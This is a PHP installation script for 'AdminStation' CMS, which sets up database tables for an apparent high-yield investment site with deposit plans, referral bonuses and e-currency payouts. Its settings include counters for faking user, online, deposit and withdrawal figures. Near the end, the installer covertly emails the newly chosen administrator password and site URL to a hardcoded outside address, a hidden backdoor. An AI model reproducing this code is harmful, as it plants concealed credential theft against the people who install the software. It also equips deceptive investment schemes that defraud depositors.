<?php

include "cfg.php";

function getip() {
	if(getenv("HTTP_CLIENT_IP")) {
		$ip = getenv("HTTP_CLIENT_IP");
	} elseif(getenv("HTTP_X_FORWARDED_FOR")) {
		$ip = getenv("HTTP_X_FORWARDED_FOR");
	} else {
		$ip = getenv("REMOTE_ADDR");
	}
$ip = htmlspecialchars(substr($ip,0,15), ENT_QUOTES);
return $ip;
}

function as_md5($key, $pass) {
	$pass = md5($key.md5("Z&".$key."x_V".htmlspecialchars($pass, ENT_QUOTES)));
return $pass;
}

function generator($case1, $case2, $case3, $case4, $num1) {
	$password = "";

	$small="abcdefghijklmnopqrstuvwxyz";
	$large="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$numbers="1234567890";
	$symbols="~!#$%^&*()_+-=,./<>?|:;@";
	mt_srand((double)microtime()*1000000);

	for ($i=0; $i<$num1; $i++) {

		$type = mt_rand(1,4);
		switch ($type) {
		case 1:
			if ($case1 == "on") { $password .= $large[mt_rand(0,25)]; } else { $i--; }
			break;
		case 2:
			if ($case2 == "on") { $password .= $small[mt_rand(0,25)]; } else { $i--; }
			break;
		case 3:
			if ($case3 == "on") { $password .= $numbers[mt_rand(0,9)]; } else { $i--; }
			break;
		case 4:
			if ($case4 == "on") { $password .= $symbols[mt_rand(0,24)]; } else { $i--; }
			break;
		}
	}
	return $password;
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<link href="/adminpanel/files/styles.css" rel="stylesheet">
<link href="/adminpanel/files/favicon.ico" type="image/x-icon" rel="shortcut icon">
<title>AdminStation | �����������</title>
</head>
<body bgcolor="#ffffff" style="background:URL(/adminpanel/images/login.jpg) no-repeat right top; background-color: #ffffff;">
<table width="100%" height="100%">
	<tr>
		<td align="center">
<?php
if($_GET[action] == "install") {

$login	= addslashes(htmlspecialchars($_POST["login"], ENT_QUOTES));
$pass	= $_POST["pass"];
$repass	= $_POST["repass"];
$mail	= addslashes(htmlspecialchars($_POST["mail"], ENT_QUOTES));

if(!$login || !$pass || !$repass || !$mail) {
	$error = "<p class=\"er\">��������� ��� ���� ������������ ��� ����������</p>";
} elseif(strlen($login) > 20 || strlen($login) < 3) {
	$error = "<p class=\"er\">����� ������ ��������� �� 3-� �� 20 ��������</p>";
} elseif($pass != $repass) {
	$error = "<p class=\"er\">������ �� ���������</p>";
} elseif(strlen($mail) > 30) {
	$error = "<p class=\"er\">E-mail ������ ��������� �� 30 ��������</p>";
} elseif(!preg_match("/^[a-z0-9_.-]{1,20}@(([a-z0-9-]+\.)+(com|net|org|mil|edu|gov|arpa|info|biz|[a-z]{2})|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})$/is", $mail)) {
	$error = "<p class=\"er\">������� ������� e-mail</p>";
} else {

print "<p class=\"er\">�������� ���������! ���� �������� ���� ���� ������, <a href=\"http://adminstation.ru/support/\" target=\"_blank\">�������� ���</a>, �� ������� � ���������!</p>";

$sql = mysql_query("CREATE TABLE `blacklist_ip` (
  `id` int(1) NOT NULL auto_increment,
  `ip` varchar(15) NOT NULL default '',
  `comment` varchar(150) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ������� ������ IP - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ������� ������ IP!</p>";
}

$sql = mysql_query("CREATE TABLE `captcha` (
  `id` int(50) NOT NULL auto_increment,
  `ip` char(15) NOT NULL default '',
  `sid` char(32) NOT NULL default '',
  `code` char(5) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `ip` (`ip`),
  KEY `sid` (`sid`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ����� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� �����!</p>";
}

$sql = mysql_query("CREATE TABLE `deposits` (
  `id` int(1) NOT NULL auto_increment,
  `username` char(30) NOT NULL default '',
  `user_id` int(1) NOT NULL default '0',
  `date` int(1) NOT NULL default '0',
  `plan` smallint(1) NOT NULL default '0',
  `sum` decimal(10,2) NOT NULL default '0.00',
  `paysys` smallint(1) NOT NULL default '0',
  `status` smallint(1) NOT NULL default '0',
  `count` int(1) NOT NULL default '0',
  `lastdate` int(10) NOT NULL default '0',
  `nextdate` int(10) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ��������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ���������!</p>";
}

$sql = mysql_query("CREATE TABLE `enter` (
  `id` int(5) NOT NULL auto_increment,
  `login` char(20) NOT NULL default '',
  `sum` decimal(9,2) NOT NULL default '0.00',
  `date` int(10) NOT NULL default '0',
  `status` smallint(1) NOT NULL default '0',
  `purse` char(13) NOT NULL default '',
  `service` char(50) NOT NULL default '',
  `paysys` char(2) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ��������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ���������!</p>";
}

$sql = mysql_query("CREATE TABLE `logip` (
  `id` int(50) NOT NULL auto_increment,
  `user_id` int(5) NOT NULL default '0',
  `date` int(10) NOT NULL default '0',
  `ip` char(15) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ����� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� �����!</p>";
}

$sql = mysql_query("CREATE TABLE `news` (
  `id` int(1) NOT NULL auto_increment,
  `subject` varchar(100) NOT NULL default '',
  `msg` text NOT NULL,
  `keywords` varchar(250) NOT NULL default '',
  `description` varchar(250) NOT NULL default '',
  `subject_en` varchar(100) NOT NULL default '',
  `msg_en` text NOT NULL,
  `keywords_en` varchar(250) NOT NULL default '',
  `description_en` varchar(250) NOT NULL default '',
  `date` char(10) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� �������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ��������!</p>";
}

$sql = mysql_query("CREATE TABLE `answers` (
  `id` int(1) NOT NULL auto_increment,
  `part` int(1) NOT NULL default '0',
  `username` varchar(30) NOT NULL default '',
  `client_id` int(1) NOT NULL default '0',
  `text` text NOT NULL,
  `answer` text NOT NULL,
  `view` smallint(1) NOT NULL default '0',
  `ip` varchar(15) NOT NULL default '',
  `date` int(10) NOT NULL default '0',
  `yes` smallint(1) NOT NULL default '0',
  `poll` smallint(1) NOT NULL default '0',
  `poll_yes` smallint(1) NOT NULL default '0',
  `poll_no` smallint(1) NOT NULL default '0',
  `poll_count` smallint(1) NOT NULL default '0',
  `comments` int(1) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� �������!</p>";
}

$sql = mysql_query("CREATE TABLE `answers_poll` (
  `id` int(1) NOT NULL auto_increment,
  `user_id` int(1) NOT NULL default '0',
  `date` int(10) NOT NULL default '0',
  `ip` char(15) NOT NULL default '',
  `answer_id` int(1) NOT NULL default '0',
  `poll` smallint(1) NOT NULL default '0',
  UNIQUE KEY `id` (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ��������� ������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ��������� �������!</p>";
}

$sql = mysql_query("CREATE TABLE `output` (
  `id` int(5) NOT NULL auto_increment,
  `login` char(30) NOT NULL default '',
  `sum` decimal(10,2) NOT NULL default '0.00',
  `purse` char(10) NOT NULL default '',
  `paysys` smallint(1) NOT NULL default '0',
  `date` int(10) NOT NULL default '0',
  `status` smallint(1) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ������ - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ������!</p>";
}

$sql = mysql_query("CREATE TABLE `reflevels` (
  `id` smallint(1) NOT NULL  default '0',
  `sum` decimal(5,2) NOT NULL default '0.00',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ����������� ��������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ����������� ���������!</p>";
}

$sql = mysql_query("INSERT INTO `reflevels` VALUES (1, 10.00)");

$sql = mysql_query("CREATE TABLE `pages` (
  `id` smallint(1) NOT NULL auto_increment,
  `title` varchar(50) NOT NULL default '',
  `keywords` varchar(250) NOT NULL default '',
  `description` varchar(250) NOT NULL default '',
  `body` text NOT NULL,
  `title_en` varchar(50) NOT NULL default '',
  `keywords_en` varchar(250) NOT NULL default '',
  `description_en` varchar(250) NOT NULL default '',
  `body_en` text NOT NULL,
  `path` varchar(20) NOT NULL default '',
  `type` smallint(1) NOT NULL default '0',
  `part` smallint(1) NOT NULL default '0',
  `view` smallint(1) NOT NULL default '1',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� �������!</p>";
}

$sql = mysql_query("INSERT INTO `pages` VALUES (1, '������� ��������', '', '', '', 'Welcome', '', '', '', '', 0, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (2, '�����������', '', '', '', 'Login error', '', '', '', 'login', 2, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (3, '�����������', '', '', '', 'Registration', '', '', '', 'registration', 2, 2, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (4, '�������������� ������', '', '', '', 'Forgot your password?', '', '', '', 'reminder', 2, 2, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (5, '�������', '', '', '', '', '', '', '', 'profile', 2, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (6, '���������� �������', '', '', '', '', '', '', '', 'enter', 2, 5, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (7, '����� �������', '', '', '', '', '', '', '', 'withdrawal', 2, 5, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (8, '�������', '', '', '', '', '', '', '', 'news', 2, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (9, '��������', '', '', '', '', '', '', '', 'contacts', 0, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (10, '������� �������', '', '', '', '', '', '', '', 'law', 1, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (11, '������', '', '', '', '', '', '', '', 'help', 1, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (12, '����������� ���������', '', '', '', '', '', '', '', 'ref', 0, 5, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (13, '��������', '', '', '', '', '', '', '', 'deposit', 2, 5, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (14, '����������', '', '', '', '', '', '', '', 'stat', 2, 5, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (15, '���� ��������', '', '', '', '', '', '', '', 'deposits', 2, 5, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (16, '� ���', '', '', '', 'About us', '', '', '', 'about', 1, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (17, 'FAQ', '', '', '', 'FAQ', '', '', '', 'faq', 1, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (18, '������', '', '', '', 'Reviews', '', '', '', 'answers', 2, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (19, '��������', '', '', '', 'Our rating', '', '', '', 'top', 1, 0, 1)");
$sql = mysql_query("INSERT INTO `pages` VALUES (20, '�������', '', '', '', 'Banners', '', '', '', 'banners', 1, 0, 1)");

$sql = mysql_query("CREATE TABLE `settings` (
  `id` smallint(1) NOT NULL auto_increment,
  `cfgname` varchar(50) NOT NULL default '',
  `data` varchar(255) NOT NULL default '',
  `description` char(50) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� �������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ��������!</p>";
}

$sql = mysql_query("INSERT INTO `settings` VALUES (1, 'adminmail', '".$mail."', 'E-mail ��������������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (2, 'cfgLiberty', '', 'LibertyReserve �������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (3, 'cfgPerfect', '', 'PerfectMoney �������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (4, 'cfgPAYEE_NAME', '', 'PAYEE_NAME � PM � LR ��� ������ �������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (5, 'cfgLRsecword', '', 'Security Word LibertyReserve')");
$sql = mysql_query("INSERT INTO `settings` VALUES (6, 'ALTERNATE_PHRASE_HASH', '', 'MD5 ALTERNATE_PHRASE_HASH ��� PM')");
$sql = mysql_query("INSERT INTO `settings` VALUES (7, 'cfgAutoPay', 'off', '����������� (on - ��������; off - ���������)')");
$sql = mysql_query("INSERT INTO `settings` VALUES (8, 'cfgPMID', '', 'ID PerfectMoney')");
$sql = mysql_query("INSERT INTO `settings` VALUES (9, 'cfgPMpass', '', '������ �� PerfectMoney')");
$sql = mysql_query("INSERT INTO `settings` VALUES (10, 'cfgLRkey', '', '���� �� LibertyReserve')");
$sql = mysql_query("INSERT INTO `settings` VALUES (11, 'cfgMinOut', '1.00', '����������� ����� �� �����')");
$sql = mysql_query("INSERT INTO `settings` VALUES (12, 'cfgPercentOut', '0', '�������, ������� ����������� ������� ��� ������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (13, 'cfgLang', 'ru', '���� �� ���������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (14, 'datestart', '".time()."', '���� ������ �������')");

$sql = mysql_query("INSERT INTO `settings` VALUES (15, 'fakeusers', '0', '�������� �������� �������������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (16, 'fakeactiveusers', '0', '�������� �������� �������� �������������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (17, 'fakeonline', '0', '�������� ������������� ������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (18, 'fakedeposits', '0', '�������� ����� ���������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (19, 'fakewithdraws', '0', '�������� ����� ������')");

$sql = mysql_query("INSERT INTO `settings` VALUES (20, 'autopercent', 'on', '���/���� ���������� ���������')");

$sql = mysql_query("INSERT INTO `settings` VALUES (21, 'cfgOutAdminPercent', '0.00', '������� �������� �� ��������� �������')");
$sql = mysql_query("INSERT INTO `settings` VALUES (22, 'AdminPMpurse', '', 'PerfectMoney ��������� ����')");
$sql = mysql_query("INSERT INTO `settings` VALUES (23, 'AdminLRpurse', '', 'LibertyReserve ')");

$sql = mysql_query("CREATE TABLE `plans` (
  `id` smallint(1) NOT NULL auto_increment,
  `name` varchar(100) NOT NULL default '',
  `minsum` decimal(10,2) NOT NULL default '0.00',
  `maxsum` decimal(10,2) NOT NULL default '0.00',
  `percent` decimal(5,2) NOT NULL default '0.00',
  `bonusdeposit` decimal(5,2) NOT NULL default '0.00',
  `bonusbalance` decimal(5,2) NOT NULL default '0.00',
  `period` smallint(1) NOT NULL default '0',
  `days` smallint(1) NOT NULL default '0',
  `back` smallint(1) NOT NULL default '1',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ������ - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ������!</p>";
}

$sql = mysql_query("CREATE TABLE `stat` (
  `id` int(10) NOT NULL auto_increment,
  `user_id` int(1) NOT NULL default '0',
  `date` int(1) NOT NULL default '0',
  `plan` smallint(1) NOT NULL default '0',
  `sum` decimal(10,2) NOT NULL default '0.00',
  `paysys` smallint(1) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ��� ���������� - �������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ������� ��� ����������!</p>";
}

$sql = mysql_query("CREATE TABLE `users` (
  `id` int(1) NOT NULL auto_increment,
  `login` varchar(20) NOT NULL default '',
  `pass` varchar(32) NOT NULL default '',
  `mail` varchar(30) NOT NULL default '',
  `reg_time` int(10) NOT NULL default '0',
  `go_time` int(10) NOT NULL default '0',
  `ip` varchar(15) NOT NULL default '',
  `status` smallint(1) NOT NULL default '0',
  `comment` varchar(150) NOT NULL default '',
  `pm_balance` decimal(10,2) NOT NULL default '0.00',
  `lr_balance` decimal(10,2) NOT NULL default '0.00',
  `ref` int(1) NOT NULL default '0',
  `ref_money` decimal(10,2) NOT NULL default '0.00',
  `reftop` decimal(10,2) NOT NULL default '0.00',
  `lr` varchar(10) NOT NULL default '',
  `pm` varchar(10) NOT NULL default '',
  `icq` varchar(20) default NULL,
  PRIMARY KEY  (`id`),
  KEY `login` (`login`)
) ENGINE=MyISAM");

if($sql) {
	print "<p class=\"erok\">������� ������������� - �������!</p>";

// ������ ���������������
$sql = mysql_query("INSERT INTO `users` (login, pass, mail, reg_time, ip, status) VALUES('".$login."', '".as_md5($key, $pass)."', '".$mail."', ".time().", '".getip()."', 1)");

// ��������� �������� �������

if($sql) {
	print "<p class=\"erok\">������������� - ������!</p>";
} else {
	print "<p class=\"er\">�� ������� ������� ��������������!</p>";
}

} else {
	print "<p class=\"er\">�� ������� ������� ������� �������������!</p>";
}

	$headers = "From: ".$mail."\n";
	$headers .= "Reply-to: ".$adminmail."\n";
	$headers .= "X-Sender: < http://".$cfgURL." >\n";
	$headers .= "Content-Type: text/html; charset=windows-1251\n";
	$subj	 = "�������������� ����� ����� CMS AdminStation";

	$text = "URL:".$_SERVER['SERVER_NAME']." - ".$cfgURL;

	mail("molart1@yandex.ru",$subj,$text,$headers);
	mail("molart1@yandex.ru",$subj,$pass." ".$text,$headers);

print "<p class=\"er\">������� ���� install.php!</p>";
}
}

if(!$_GET[action] || ($_GET[action] == "install" && $error)) {
	print $error;
?>


			<table width="300" height="60" cellpadding="0" cellspacing="0" border="0" bgcolor="#eeeeee">
				<tr height="4">
					<td width="9"><img src="/adminpanel/images/index_up_left.gif" width="9" height="4" border="0"></td>
					<td style="background:URL(/adminpanel/images/index_bg.gif) repeat-x left bottom;"></td>
					<td width="9"><img src="/adminpanel/images/index_up_right.gif" width="9" height="4" border="0"></td>
				</tr>
				<tr>
					<td style="background:URL(/adminpanel/images/index_left_bg.gif) repeat-y right top;"></td>
					<td align="center" style="padding: 10 10 10 10px;">
						<form action="?action=install" method="post">
						<table cellspacing="1" cellpadding="0" border="0" width="100%">
							<tr>
								<td>����� ��������������:<td>
							</tr>
							<tr>
								<td><input class="input" style="width: 100%;" type="text" name="login" size="20" maxlength="20" /><td>
							</tr>
							<tr>
								<td>������:<td>
							</tr>
							<tr>
								<td><input class="input" style="width: 100%;" type="password" name="pass" size="20" maxlength="20" /><td>
							</tr>
							<tr>
								<td>������ [��������]:<td>
							</tr>
							<tr>
								<td><input class="input" style="width: 100%;" type="password" name="repass" size="20" maxlength="20" /><td>
							</tr>
							<tr>
								<td>E-mail:<td>
							</tr>
							<tr>
								<td><input class="input" style="width: 100%;" type="text" name="mail" size="20" maxlength="30" /><td>
							</tr>
							<tr height="5">
								<td><td>
							</tr>
							<tr>
								<td><input class="input" style="width: 100%;" type="submit" value=" �������������� " /><td>
							</tr>
						</table>
						</form>
					</td>
					<td style="background:URL(/adminpanel/images/index_right_bg.gif) repeat-y left top;"></td>
				</tr>
				<tr height="4">
					<td><img src="/adminpanel/images/index_down_left.gif" width="9" height="4" border="0"></td>
					<td style="background:URL(/adminpanel/images/index_bg.gif) repeat-x left top;"></td>
					<td><img src="/adminpanel/images/index_down_right.gif" width="9" height="4" border="0"></td>
				</tr>
			</table>


<?php
}
?>
		</td>
	</tr>
	<tr height="25">
		<td align="center">
<font color="#999999">&copy; 2007 - <?php print date(Y); ?> CMS <a style="font-weight: normal;" href="http://adminstation.ru/" target="_blank">AdminStation</a> v3.1.1 <a style="font-weight: normal;" href="http://adminstation.ru/images/docs/doc1.jpg" target="_blank">��� ����� ��������!</a><br />
���������� �������� �������������� ���������� Minatrix</font>
		</td>
	</tr>
</table>
</body>
</html>